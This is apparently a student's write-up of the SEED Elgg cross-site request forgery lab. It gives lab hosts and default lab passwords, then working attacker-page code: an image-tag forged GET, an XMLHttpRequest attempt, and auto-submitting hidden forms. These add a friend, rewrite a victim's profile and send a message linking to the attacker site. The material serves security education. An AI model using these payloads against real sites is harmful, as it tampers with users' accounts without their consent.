* Lab Setup

Configure the /etc/hosts file to 

10.9.0.5 www.seed-server.com
10.9.0.5 www.example32.com
10.9.0.105 www.attacker32.com

** Credentials
|----------+-------------|
| Username | Password    |
|----------+-------------|
| admin    | seedelgg    |
|----------+-------------|
| alice    | seedalice   |
|----------+-------------|
| boby     | seedboby    |
|----------+-------------|
| charlie  | seedcharlie |
|----------+-------------|
| samy     | seedsamy    |
|----------+-------------|


* Task 1
** Approach 1
*** Inject malicious link in the image source
#+BEGIN_SRC html
  <html>
    <body>
      <h1>This page forges an HTTP GET request</h1>
      <img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
    </body>
  </html>
#+END_SRC

Inserting malicious link in HTTP image tag doesn't work anymore, because of CORB (Cross Origin Read Blocking)
which can ~identify and block dubious cross origin resource loads~ before they even reach the webpage.

** Approach 2
*** Inject malicious javascript with XMLHttpRequest
#+BEGIN_SRC javascript
  <script>
      window.onload=function(){
          var sendurl="http://www.seed-server.com/action/friends/add?friend=59";
          var Ajax=new XMLHttpRequest();
          Ajax.open("GET", sendurl, true);
          Ajax.send();
      }
  </script>
#+END_SRC
Why doesn't the AJAX request from cross origin doesn't work where as form requests from different site works?

** Approach 3
Send data as form requests from attackers site
#+BEGIN_SRC javascript
  <script type="text/javascript">
      function forge_post(){
          var fields;

          // The following are form entries need to be filled out by attackers.
          // The entries are made hidden, so the victim won't be able to see them.
          fields += "<input type='hidden' name='friend' value='59'>";

          // Create a <form> element.
          var p = document.createElement("form");

          // Construct the form
          p.action = "http://www.seed-server.com/action/friends/add";
          p.innerHTML = fields;
          p.method = "get";

          // Append the form to the current page.
          document.body.appendChild(p);

          // Submit the form
          p.submit();
      }

      // Invoke forge_post() after the page is loaded.
      window.onload = function() { forge_post();}
  </script>
#+END_SRC
** Screenshot

[[./screenshots/task-1.png]]


* Task 2
** Part 1

#+BEGIN_SRC javascript
  <script type="text/javascript">
		function forgeRequest() {
			let fields = "";
			fields += `<input type="hidden" name="briefdescription" value="Samy is my hero">`;
			fields += `<input type="hidden" name="accesslevel[briefdescription]" value="2">`;
			fields += `<input type="hidden" name="guid" value="56">`;

			// Create a <form> element.
			var p = document.createElement("form");

			// Construct the form
			p.action = "http://www.seed-server.com/action/profile/edit";
			p.innerHTML = fields;
			p.method = "post";

			// Append the form to the current page.
			document.body.appendChild(p);

			// Submit the form
			p.submit();
		}

		window.onload = () => {
			console.log(document.cookie)
			forgeRequest();
		}
	</script>
#+END_SRC

[[./screenshots/task-2-1.png]]

We can get the guid of Alice by visiting her profile even in logged out mode and get the guid by searching the webpage

[[./screenshots/task-2-1-1.png]]

As we can see here the GUID of Alice's account is 56

** Part 2


* Task 3

#+BEGIN_SRC javascript
	<script type="text/javascript">
		function forgeRequest() {
			let fields = "";
			fields += `<input type="hidden" name="briefdescription" value="Samy is my hero">`;
			fields += `<input type="hidden" name="accesslevel[briefdescription]" value="2">`;
			fields += `<input type="hidden" name="interests" value="Hacking">`;

			fields += `<input type="hidden" name="twitter" value="Geralt">`;
			fields += `<input type="hidden" name="accesslevel[twitter]" value="2">`;
			fields += `<input type="hidden" name="guid" value="56">`;

			// Create a <form> element.
			var p = document.createElement("form");

			// Construct the form
			p.action = "http://www.seed-server.com/action/profile/edit";
			p.innerHTML = fields;
			p.method = "post";

			// Append the form to the current page.
			document.body.appendChild(p);

			// Submit the form
			p.submit();
		}

		window.onload = () => {
			console.log(document.cookie)
			forgeRequest();
		}
	</script>
#+END_SRC

[[./screenshots/task-2-2.png]]

* Task 4
Whenever alice visits the infected link in Samy's profile, a message is sent to Boby with the malicious URL and
Boby eventually becomes a victim of Samy's insidious plans :)
#+BEGIN_SRC javascript
	<script type="text/javascript">
		function forgeRequest() {
			let fields = "";
			fields += `<input type="hidden" name="match_on" value="users">`;
			fields += `<input type="hidden" name="recipients[]" value="57">`;
			fields += `<input type="hidden" name="subject" value="Ha Ha Ha">`;
			fields += `<input type="hidden" name="body" value="www.attacker32.com">`;

			// Create a <form> element.
			var p = document.createElement("form");

			// Construct the form
			p.action = "http://www.seed-server.com/action/messages/send";
			p.innerHTML = fields;
			p.method = "post";

			// Append the form to the current page.
			document.body.appendChild(p);

			// Submit the form
			p.submit();
		}

		window.onload = () => {
			console.log(document.cookie)
			forgeRequest();
		}
	</script>
#+END_SRC

[[./screenshots/task-4.png]]
